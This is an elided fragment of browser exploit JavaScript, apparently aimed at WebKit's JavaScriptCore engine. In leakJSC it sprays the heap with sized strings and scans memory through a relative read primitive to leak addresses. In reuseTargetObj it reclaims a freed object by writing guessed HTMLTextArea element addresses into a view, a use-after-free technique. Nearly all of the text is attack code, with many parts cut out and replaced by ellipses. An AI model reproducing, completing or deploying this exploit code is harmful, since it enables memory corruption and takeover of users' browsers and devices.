...
function leakJSC() {
	...
	debug_log("[+] Got a relative read");
        ...
        for(var i = 0; i < 100000; i++)
                tmp_spray['Z'.repeat(16 * 3 * 16 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(5, '0')] = 0x1337;
		...
		for (let i = 0; i < 0x800000; i++) {
			...
			if (g_relative_read.charCodeAt(i) === 0x42 &&
				...
				if (g_relative_read.charCodeAt(i + 0x08) === 0x00 &&
					...
					v = new Int64(str2array(g_relative_read, 16, i + 0x20));
...
function reuseTargetObj() {
	...
	for (let i = 0; i < NB_REUSE; i++) {
		...
		view[0] = guess_htmltextarea_addr1.asDouble();   // m_element
		view[3] = guess_htmltextarea_addr2.asDouble();   // m_bubble
		view[4] = guess_htmltextarea_addr3.asDouble();   //
